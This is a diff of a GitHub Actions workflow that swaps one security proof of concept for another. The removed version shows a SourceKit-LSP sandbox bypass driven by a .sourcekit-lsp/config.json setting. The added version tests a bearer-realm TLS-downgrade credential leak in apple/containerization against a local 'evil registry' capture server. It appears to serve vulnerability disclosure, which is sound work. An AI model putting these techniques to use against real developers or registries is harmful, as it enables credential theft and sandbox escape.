@@ -1,60 +1,71 @@
-name: SourceKit-LSP disableSandbox PoC
+name: PoC OE1107246042217 Bearer Realm TLS Downgrade SSRF
 
 on:
   push:
-    branches: [main]
+    branches: [ main ]
   workflow_dispatch:
 
 jobs:
-  sandbox-bypass-poc:
-    runs-on: macos-latest
-    steps:
-      - uses: actions/checkout@v4
+  poc:
+    name: RegistryClient Bearer Realm Credential Leak
+    runs-on: ubuntu-latest
 
-      - name: Swift version
+    steps:
+      - name: Checkout PoC repo
+        uses: actions/checkout@v4
+        with:
+          path: poc
+
+      - name: Checkout apple/containerization
+        uses: actions/checkout@v4
+        with:
+          repository: apple/containerization
+          ref: main
+          path: containerization
+
+      - name: L1 Static evidence no scheme validation
+        run: |
+          grep -n "realm" containerization/Sources/ContainerizationOCI/Client/RegistryClient+Token.swift
+          sed -n '155,175p' containerization/Sources/ContainerizationOCI/Client/RegistryClient.swift
+          result=$(grep -rn "realm.*scheme" containerization/Sources/ContainerizationOCI/Client/ 2>/dev/null || true)
+          if [ -z "$result" ]; then echo "[L1-PASS] Zero scheme-validation references found"; else echo "$result"; fi
+
+      - name: Install Swift 6.1.2
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y --no-install-recommends binutils git gnupg2 libc6-dev libcurl4-openssl-dev libedit2 libgcc-13-dev libpython3-dev libsqlite3-0 libstdc++-13-dev libxml2-dev libz3-dev pkg-config tzdata unzip zlib1g-dev
+          curl -fsSL "https://download.swift.org/swift-6.1.2-release/ubuntu2404/swift-6.1.2-RELEASE/swift-6.1.2-RELEASE-ubuntu24.04.tar.gz" -o swift.tar.gz
+          sudo tar -xzf swift.tar.gz -C /opt
+          echo "/opt/swift-6.1.2-RELEASE-ubuntu24.04/usr/bin" >> $GITHUB_PATH
+
+      - name: Verify Swift version
         run: swift --version
 
-      - name: "BASELINE — sandbox ENABLED (write to /tmp should FAIL)"
-        run: |
-          rm -f /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null || true
-          # Normal invocation — ManifestLoader runs Package.swift WITH sandbox
-          swift package --package-path . show-dependencies 2>&1 || true
-          if ls /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null; then
-            echo "UNEXPECTED: marker created even with sandbox enabled"
-            cat /tmp/SOURCEKIT_LSP_BYPASS_*
-            exit 1
-          else
-            echo "EXPECTED: No marker file — sandbox blocked the write to /tmp"
-          fi
+      - name: Install PoC Swift test
+        run: cp poc/Tests/ContainerizationOCITests/BearerRealmDowngradeTest.swift containerization/Tests/ContainerizationOCITests/BearerRealmDowngradeTest.swift
 
-      - name: "EXPLOIT — disableSandbox:true (mirrors SourceKit-LSP with config.json)"
+      - name: Start evil registry and capture server
         run: |
-          rm -f /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null || true
-          # --disable-sandbox mirrors what SourceKit-LSP does when it reads:
-          # .sourcekit-lsp/config.json -> swiftPM.disableSandbox = true
-          # -> ManifestLoader(isManifestSandboxEnabled: false)
-          swift package --package-path . --disable-sandbox show-dependencies 2>&1 || true
-          if ls /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null; then
-            echo ""
-            echo "*** SANDBOX BYPASS CONFIRMED ***"
-            echo "Marker file(s):"
-            ls -la /tmp/SOURCEKIT_LSP_BYPASS_*
-            echo "Contents:"
-            cat /tmp/SOURCEKIT_LSP_BYPASS_*
-          else
-            echo "Not triggered — check Package.swift Foundation availability"
-            exit 1
-          fi
+          python3 poc/scripts/evil_registry.py > /tmp/capture.log 2>&1 &
+          sleep 1
+          cat /tmp/capture.log
 
-      - name: "Show SourceKit-LSP source — disableSandbox propagation"
+      - name: L2 Swift tests
+        working-directory: containerization
+        run: EVIL_REGISTRY_RUNNING=1 swift test --filter BearerRealmDowngradeTest 2>&1 | tee /tmp/swift_test.txt
+
+      - name: E2E results
         run: |
-          echo "=== Key line in SwiftPMBuildServer.swift ==="
-          echo "Line 319:"
-          echo '  isManifestSandboxEnabled: !(options.swiftPMOrDefault.disableSandbox ?? false)'
-          echo ""
-          echo "=== Key line in SourceKitLSPOptions.swift ==="
-          echo "Line 585:"
-          echo '  path: workspaceFolder.fileURL?.appending(components: ".sourcekit-lsp", "config.json")'
-          echo ""
-          echo "=== Attack config (.sourcekit-lsp/config.json) ==="
-          cat .sourcekit-lsp/config.json
+          cat /tmp/capture.log
+          cat /tmp/swift_test.txt
+          grep -q "L1-PASS" /tmp/swift_test.txt && echo "[RESULT] L1+L2 PASS" || true
+          grep -q "TLS-downgrade" /tmp/capture.log && echo "[RESULT] E2E PASS" || true
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-results
+          path: |
+            /tmp/capture.log
+            /tmp/swift_test.txt
